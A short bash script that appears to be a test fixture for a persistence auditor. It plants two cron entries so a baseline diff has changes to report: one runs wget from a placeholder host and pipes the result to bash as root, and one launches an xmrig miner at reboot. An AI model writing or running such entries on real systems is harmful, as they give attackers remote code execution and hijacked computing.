#!/bin/bash
# Change watched persistence files between the first and second audit so the
# baseline diff has something to report.
set -euo pipefail
printf '0 3 * * * root wget -qO- http://x/z.sh | bash\n' >> /etc/cron.d/evil
printf '@reboot root /tmp/.x/xmrig\n' > /etc/cron.d/evil2
echo "mutated: appended to /etc/cron.d/evil, created /etc/cron.d/evil2"
